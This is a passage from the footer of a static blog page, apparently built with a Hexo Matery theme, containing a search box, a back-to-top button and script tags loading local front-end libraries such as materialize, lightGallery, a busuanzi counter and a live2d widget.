            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input" autofocus="">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script src="/js/search.js"></script>
<script type="text/javascript">
    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
</script>
<!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fa fa-angle-up"></i>
    </a>
</div>


<script src="/libs/materialize/js/materialize.min.js"></script>
<script src="/libs/masonry/masonry.pkgd.min.js"></script>
<script src="/libs/aos/aos.js"></script>
<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
<script src="/js/matery.js"></script>

<!-- Global site tag (gtag.js) - Google Analytics -->




    <script async src="/libs/others/busuanzi.pure.mini.js"></script>


<script src="/live2d-widget/autoload.js"></script>
</body>
</html>